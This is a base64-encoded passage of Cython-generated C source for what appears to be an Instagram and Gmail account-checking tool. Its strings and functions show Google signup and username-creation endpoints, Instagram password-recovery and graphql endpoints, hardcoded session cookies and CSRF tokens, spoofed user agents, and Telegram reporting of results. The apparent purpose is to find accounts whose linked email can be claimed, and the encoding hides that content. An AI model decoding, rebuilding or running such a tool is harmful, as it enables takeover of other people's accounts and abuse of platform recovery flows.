jQwYVwzMzBcMDEwXDAyM1wyMjAxXDMzMFx0XDAyNFwyMjBDXDIyMFwxNzdcMjQwYVwzMzBcMDEwXDAyM1wyMjAxXDMzMFx0XDAyNVwyMjBTXDIzMFwwMTdcMjQwcVwzMzBcMDEwXDAyM1wyMjAxXDMzMFx0XDAyNVwyMjBTXDIzMFwwMTdcMjQwcVwzMzBcMDEwXDAyM1wyMjAxXDMzMFx0XDAyNVwyMjBTXDIzMFwwMTdcMjQwcVwzMzBcMDEwXDAyM1wyMjAxXDMzMFx0XDAyNVwyMjBTXDIzMFwwMTdcMjQwcVwzMzBcMDEwXDAyM1wyMjAxXDMzMFx0XDAyNVwyMjBTXDIzMFwwMTdcMjQwcVwzMzBcMDEwXDAyM1wyMjAxXDM0MFwwMTBcMDIzXDIyMDFcMzQwXDAwNFwwMjBcMjIwXDAxNFwyMzBEXDI0MFwwMDFcMzIwITNcMjYwMVwzMzBcMDA0XDAwNVwzMzBcMDEwXDAyNFwyMjBDXDIyMHFcMjMwXDAwMVwzNDBcMDEwXDAyNFwyMjBBXDMzMFwwMDRcMDA3XDIwMHpcMjIwXDAyMlwyMjAxXDMzMFwwMTBcdFwzNDBcMDA0XDAyMFwyMjBcMDE0XDIzMERcMjQwXDAwMVwzMjAhNFwyNjBBXDMzMFwwMDRcMDIyXDIyMCFcMzMwXDAwNFwwMjBcMjIwXDAwNFwzMjBcMDI0VFwzMjBUaVwzNjBcMDAwXDAwMGpcMDAxSVwwMDJcMzYwXDAwMFwwMDBJXDAwMk1cMDAyXDM2MFwwMDBcMDAwTVwwMDJOXDAwMlwzNjBcMDAwXDAwME5cMDAyaFwwMDJcMzYwXDAwMFwwMDBoXDAwMkJcMDAzXDM2MFwwMDBcMDAwQlwwMDNZXDAwM1wzNjBcMDAwXDAwMFlcMDAzR1wwMDRcMzYwXDAwMFwwMDBHXDAwNEhcMDA0XDM2MCZcMDAwXDAwNVxuXDIxMFwwMjFcMjEwIVwzNDBcdFxyXDIxMFFcMzIwXDAxNlwwMzdcMjMweFwyNDBxXDMzMFwwMTBcdFwyMTBcMDI2XDIxMHFcMjIwXG5cMjMwXCJcMjMwQVwzNDBcMDA0XDAwNVwzMzBcMDEwXHRcMzMwXDAxNFwwMzdcMjMwcVwzMzBcMDIwXDAyMVwzMzBcMDI1XDAzNVwyMzBZXDI0MGdcMjUwUVwzMzBcMDI1XDAzNVwyMzBdXDI1MCdcMjYwXDAyMVwzNjBcblwwMDBcdFwwMjFcMjIwXDAwNFwyMjBBXDIyMFJcMzIwXDAyNzdcMjYwcVwzMzBcMDI1XDAyNlwzMzBcMDMxJFwyNDBBXDMzMFwwMzEhXDI0MFwwMjFcMzMwXDAzMSdcMjQwcVwzMzBcMDMxKVwyNTBcMDI0XDI1MFZcMjYwMVwyNjBBXDMzMFwwMzE1XDI2MFFcMzQwXDAwNFwwMTNcMjEwPVwyMzBcMDAxXDMzMFwwMTBcclwyMTBRXDMyMFwwMTY1XDI2MFEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0FfQmdUX1FkXzdfWnJfMV9RZF9JUWFfMUFfUFBRX2FbXSA9ICJcMjAwXDAwMVwzMzBcMDA0XDAwNVwzMzBcMDA0XHRcMzIwXHRcMDM0XDIzMEFcMzMwXDAwNFxuXDIxMCFcMzMwXDAwNFwwMjBcMjIwXDAwNFwyMjBCXDIyMGdcMjMwVFwyNDBcMDIxXDI0MCNcMjQwUVwyNDBkXDI1MCZcMjYwXDAwM1wyNjA3XDI3MCNcMjcwWlwzMDByXDMxMFwwMjJcMzEwMVwzMzBcMDA0XG5cMjEwI1wyMTBRXDIxMGRcMjIwJlwyMzBcMDAxXDMzMFwwMDRcMDA1XDMzMFwwMTBcMDIxXDIyMFwwMjFcMzIwXDAyMihcMjUwXDAwMVwzMzBcMDEwXDAyMVwyMjBcMDIxXDMyMFwwMjIkXDI0MElcMjUwUVwyNTBhXDMzMFwwMTBcMDIxXDIyMFwwMjFcMzIwXDAyMipcMjUwKVwyNjAxXDI2MEFcMzQwXDAwNFwwMDVcMzMwXDAxMFwwMjFcMjIwXDAyMVwyMjAhXDMzMFwwMTRQXDMyMFBRXDMzMFwwMTRcMDIwXDIyMFwwMDZcMjIwYVwzMzBcMDIwXDAzNlwyMzBhXDMzMFwwMjBcMDMwXDIzMFwwMDFcMzMwXDAyMFwwMzBcMjMwXDAwMVwzMzBcMDIwXDAzNVwyMzBRXDMzMFwwMjBcMDMxXDIzMFwwMjFcMzYwXDAwNlwwMDBcdFwwMjJcMjIwXDAyMVwzMjBcMDIyKVwyNTBcMDIxXDM0MFwwMDRcMDE3XDIxMHdcMjIwZVwyMzAxXDMzMFwwMTBcMDIxXDIyMFwwMjFcMzIwXDAyMi1cMjUwWFwyNjBZXDI3MGVcMzAwNVwzMTBcMDAxXDMzMFwwMDRcMDA3XDIwMHZcMjEwU1wyMjBcMDAxXDMzMFwwMTBcMDEzXDIxMDlcMjIwQVwyMjBbXDI0MFwwMDNcMjQwMVwzMzBcMDE0XDAyN1wyMjBxXDIzMFwwMDFcMzMwXDAxMFwwMjNcMjIwMVwzMzBcMDEwXDAyNFwyMjBBXDM0MFwwMTBcMDI1XDIyMFFcMzMwXDAxMFwwMjRcMjIwQSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYXJfSVFfYXJfcV8wXzlfZW5fSVFfcV8wXzhfZW5fcVtdID0gImFyLUlRLGFyO3E9MC45LGVuLUlRO3E9MC44LGVuO3E9MC43LGVuLVVTO3E9MC42IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsW10gPSAiW251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxcIk5MXCIsbnVsbCxudWxsLG51bGwsXCJHbGlmV2ViU2lnbkluXCIsbnVsbCxbXSxudWxsLG51bGwsbnVsbCxudWxsLDIsbnVsbCwwLDEsXCJcIixudWxsLG51bGwsMiwyXSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2lnbmluX3YyX3VzZXJuYW1lcmVjb3ZlcnlfZmxvd1tdID0gIi9zaWduaW4vdjIvdXNlcm5hbWVyZWNvdmVyeT9mbG93TmFtZT1HbGlmV2ViU2lnbkluJmZsb3dFbnRyeT1TZXJ2aWNlTG9naW4maGw9ZW4tR0IiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwW10gPSAiMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAyMDEyZmIwYTMyOWJjYWZiM2IxZjRjMGJiNTZiMWYxZi4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzUwY2M2ODYxXzcwMzZfNDNiNF84MDJlX2ZiNDI4Mjc5W10gPSAiNTBjYzY4NjEtNzAzNi00M2I0LTgwMmUtZmI0MjgyNzk5YzYwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa185eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaltdID0gIjl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19JbnN0YWdyYW1fMTAwXzBfMF8xN18xMjlfQW5kcm9pZFtdID0gIkluc3RhZ3JhbSAxMDAuMC4wLjE3LjEyOSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIxMjk7IHNhbXN1bmc7IFNNLU0yMDVGOyBtMjBsdGU7IGV4eW5vczc5MDQ7IGVuX0dCOyAxNjE0Nzg2NjQpIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19Nb3ppbGxhXzVfMF9XaW5kb3dzX05UXzEwXzBfV2luNltdID0gIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjAuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTIwLjAuMC4wIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19UZWxlZ3JhbV9tZXNzYWdlX2NvdWxkX25vdF9iZV9zZVtdID0gIlRlbGVncmFtIG1lc3NhZ2UgY291bGQgbm90IGJlIHNlbnQ6IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZVtdID0gImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYzgwYzVmYjMwZGZhZTllMjczZTQwMDlmMDNiMTgyODBbXSA9ICJjODBjNWZiMzBkZmFlOWUyNzNlNDAwOWYwM2IxODI4MGJiMzQzYjA4NjJkNjYzZjMxYTNjNjNmMTNhOWYzMWMwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jb250aW51ZV9odHRwc18zQV8yRl8yRm1haWxfZ29vZ1tdID0gImNvbnRpbnVlPWh0dHBzJTNBJTJGJTJGbWFpbC5nb29nbGUuY29tJTJGbWFpbCUyRnUlMkYwJTJGJmRkbT0wJmZsb3dFbnRyeT1TaWduVXAmc2VydmljZT1tYWlsJnRoZW1lPW1uJmYucmVxPSU1QiUyMlRMJTNBIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kYXRhX2luaXRpYWxfc2V0dXBfZGF0YV9udWxsX251bFtdID0gImRhdGEtaW5pdGlhbC1zZXR1cC1kYXRhPVwiJS5ALm51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLCZxdW90OyguKj8pJnF1b3Q7LG51bGwsbnVsbCxudWxsLCZxdW90OyguKj8pJiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBbXSA9ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20vc2lnbnVwL3YyL2NyZWF0ZWFjY291bnQ/c2VydmljZT1tYWlsJmNvbnRpbnVlPWh0dHBzJTNBJTJGJTJGbWFpbC5nb29nbGUuY29tJTJGbWFpbCUyRnUlMkYwJTJGJnRoZW1lPW1uIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19pX2luc3RhZ3JhbV9jb21fYXBpX3YxX2FjY1tdID0gImh0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS9hY2NvdW50cy9zZW5kX3JlY292ZXJ5X2Zsb3dfZW1haWwvIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcFtdID0gImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYXBpL2dyYXBocWwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21pZF9aVmZHdmdBQkFBR29RcWE3QVkzbWdvWUJWMW5QW10gPSAibWlkPVpWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblA7IGNzcmZ0b2tlbj05eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMltdID0gIjBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwMjAxMmZiMGEzMjliY2FmYjNiMWY0YzBiYjU2YjFmMWYue1wiX2NzcmZ0b2tlblwiOlwiOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmpcIixcImFkaWRcIjpcIjBkZmFmODIwLTI3NDgtNDYzNC05MzY1LWMzZDhjODAxMTI1NlwiLFwiZ3VpZFwiOlwiMWY3ODQ0MzEtMjY2My00ZGI5LWI2MjQtODZiZDljZTFkMDg0XCIsXCJkZXZpY2VfaWRcIjpcImFuZHJvaWQtYjkzZGRiMzdlOTgzNDgxY1wiLFwicXVlcnlcIjpcIiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGVfMltdID0gImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDtjaGFyc2V0PVVURi04IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cF8yW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cC92Mi9jcmVhdGV1c2VybmFtZT9zZXJ2aWNlPW1haWwmY29udGludWU9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmVEw9IjsKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmF3X3RpbmZvKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfMnBwcHAoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd180dXBkYXRlX3N0YXRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfNUdob3N0X2dlbmV4cHIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmF3XzVHaG9zdF8zZ2VuZXhwcihQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfNUdob3N0XzZnZW5leHByKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd182R2hvc3QoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd184Y2hlY2tfZ21haWwoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfMTBjaGVjayhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd18xMnJlc3QoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd18xNEluZm9BY2MoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZG9tYWluKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmF3XzE2R2hvc3RweShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmF3XzE4c3RhdHNfbG9vcChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0KFB5VHlwZU9iamVjdCAqdCwgUHlPYmplY3QgKmEsIFB5T2JqZWN0ICprKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgUHlPYmplY3QgKmEsIFB5T2JqZWN0ICprKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgUHlPYmplY3QgKmEsIFB5T2JqZWN0ICprKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgUHlPYmplY3QgKmEsIFB5T2JqZWN0ICprKTsgCgoKCiNpZm5kZWYgQ1lUSE9OX1NNQUxMX0NPREUKI2lmIGRlZmluZWQoX19jbGFuZ19fKQogICAgI2RlZmluZSBDWVRIT05fU01BTExfQ09ERQojZWxpZiBkZWZpbmVkKF9fR05VQ19fKSAmJiAoX19HTlVDX18gPiA0IHx8IChfX0dOVUNfXyA9PSA0ICYmIF9fR05VQ19NSU5PUl9fID49IDMpKQogICAgI2RlZmluZSBDWVRIT05fU01BTExfQ09ERSBfX2F0dHJpYnV0ZV9fKChjb2xkKSkKI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX1NNQUxMX0NPREUKI2VuZGlmCiNlbmRpZgoKdHlwZWRlZiBzdHJ1Y3QgewogIFB5T2JqZWN0ICpfX3B5eF9kOwogIFB5T2JqZWN0ICpfX3B5eF9iOwogIFB5T2JqZWN0ICpfX3B5eF9jeXRob25fcnVudGltZTsKICBQeU9iamVjdCAqX19weXhfZW1wdHlfdHVwbGU7CiAgUHlPYmplY3QgKl9fcHl4X2VtcHR5X2J5dGVzOwogIFB5T2JqZWN0ICpfX3B5eF9lbXB0eV91bmljb2RlOwogICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0N5RnVuY3Rpb25UeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfR2VuZXJhdG9yVHlwZTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfSXRlcmFibGVDb3JvdXRpbmVfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfSXRlcmFibGVDb3JvdXRpbmVUeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfQ29yb3V0aW5lQXdhaXRUeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfQ29yb3V0aW5lVHlwZTsKICAjZW5kaWYKICBQeU9iamVjdCAqX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdDsKICBQeU9iamVjdCAqX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0OwogIFB5VHlwZU9iamVjdCAqX19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHI7CiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByOwogIF9fUHl4X0NhY2hlZENGdW5jdGlvbiBfX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcDsKICBQeU9iamVjdCAqX19weXhfc2xpY2VbMV07CiAgUHlPYmplY3QgKl9fcHl4X3R1cGxlWzEwXTsKICBQeU9iamVjdCAqX19weXhfY29kZW9ial90YWJbMTNdOwogIFB5T2JqZWN0ICpfX3B5eF9zdHJpbmdfdGFiWzM2OV07CiAgUHlPYmplY3QgKl9fcHl4X2Zsb2F0XzBfMDIwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjsKICBQeU9iamVjdCAqX19weXhfaW50XzM7CiAgUHlPYmplY3QgKl9fcHl4X2ludF82OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfOTsKICBQeU9iamVjdCAqX19weXhfaW50XzE1OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTY7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8zMDsKICBQeU9iamVjdCAqX19weXhfaW50XzMyOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDEwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxMTsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTI7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDEzOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxNDsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTU7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDE2OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxNzsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTg7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDE5OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAyMDsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMjE7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDIyOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAyMzsKICBQeU9iamVjdCAqX19weXhfaW50XzEyNzg4ODk7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xMjc5MDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTc3NTAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xNzc1MDAwMTsKICBQeU9iamVjdCAqX19weXhfaW50XzI3OTc2MDAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzI3OTc2MDAwMTsKICBQeU9iamVjdCAqX19weXhfaW50XzkwMDk5MDAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzkwMDk5MDAwMTsKICBQeU9iamVjdCAqX19weXhfaW50XzE2MjkwMTAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xNjI5MDEwMDAxOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjM2OTM1OTc2MTsKICBQeU9iamVjdCAqX19weXhfaW50XzIzNjkzNTk3NjI7CiAgUHlPYmplY3QgKl9fcHl4X2ludF80MjM5NTE2NzU0OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNDIzOTUxNjc1NTsKICBQeU9iamVjdCAqX19weXhfaW50XzYzNDUxMDgyMDk7CiAgUHlPYmplY3QgKl9fcHl4X2ludF82MzQ1MTA4MjEwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTAwMTYyMzIzOTU7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xMDAxNjIzMjM5NjsKICBQeU9iamVjdCAqX19weXhfaW50XzI3MjM4NjAyMTU5OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjcyMzg2MDIxNjA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF80MzQ2NDQ3NTM5NTsKICBQeU9iamVjdCAqX19weXhfaW50XzQzNDY0NDc1Mzk2OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNTAyODkyOTc2NDc7CiAgUHlPYmplY3QgKl9fcHl4X2ludF81MDI4OTI5NzY0ODsKICBQeU9iamVjdCAqX19weXhfaW50XzU3NDY0NzA3MDgyOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNTc0NjQ3MDcwODM7CiAgUHlPYmplY3QgKl9fcHl4X2ludF82MzMxMzQyNjkzODsKCgojaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCAqX19weXhfZnJlZWxpc3RfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3RbOF07CmludCBfX3B5eF9mcmVlY291bnRfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3Q7CiNlbmRpZgoKI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCnN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKl9fcHl4X2ZyZWVsaXN0XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByWzhdOwppbnQgX19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByOwojZW5kaWYKCiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwpzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpfX3B5eF9mcmVlbGlzdF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcls4XTsKaW50IF9fcHl4X2ZyZWVjb3VudF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKI2VuZGlmCgojaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqX19weXhfZnJlZWxpc3RfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJbOF07CmludCBfX3B5eF9mcmVlY291bnRfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHI7CiNlbmRpZgoKUHlUeXBlT2JqZWN0ICpfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGU7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKUHlPYmplY3QgKl9fUHl4X0NhY2hlZE1ldGhvZFR5cGU7CiNlbmRpZgoKCnN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgX19weXhfY29kZV9jYWNoZTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMApQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZTsKI2VuZGlmCgoKfSBfX3B5eF9tc3RhdGV0eXBlOwoKI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiNpZmRlZiBfX2NwbHVzcGx1cwpuYW1lc3BhY2UgewpleHRlcm4gc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZjsKfSAKI2Vsc2UKc3RhdGljIHN0cnVjdCBQeU1vZHVsZURlZiBfX3B5eF9tb2R1bGVkZWY7CiNlbmRpZgoKI2RlZmluZSBfX3B5eF9tc3RhdGVfZ2xvYmFsIChfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKCZfX3B5eF9tb2R1bGVkZWYpKSkKCiNkZWZpbmUgX19weXhfbSAoX19QeXhfU3RhdGVfRmluZE1vZHVsZSgmX19weXhfbW9kdWxlZGVmKSkKI2Vsc2UKc3RhdGljIF9fcHl4X21zdGF0ZXR5cGUgX19weXhfbXN0YXRlX2dsb2JhbF9zdGF0aWMgPQojaWZkZWYgX19jcGx1c3BsdXMKICAgIHt9OwojZWxzZQogICAgezB9OwojZW5kaWYKc3RhdGljIF9fcHl4X21zdGF0ZXR5cGUgKiBjb25zdCBfX3B5eF9tc3RhdGVfZ2xvYmFsID0gJl9fcHl4X21zdGF0ZV9nbG9iYWxfc3RhdGljOwojZW5kaWYKCiNkZWZpbmUgX19weXhfa3BfdV8gX19weXhfc3RyaW5nX3RhYlswXQojZGVmaW5lIF9fcHl4X2twX3VfMCBfX3B5eF9zdHJpbmdfdGFiWzFdCiNkZWZpbmUgX19weXhfa3BfdV8wXzBfbnVsbF9udWxsX3dlYl9nbGlmX3NpZ251cF8wIF9fcHl4X3N0cmluZ190YWJbMl0KI2RlZmluZSBfX3B5eF9rcF91XzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwIF9fcHl4X3N0cmluZ190YWJbM10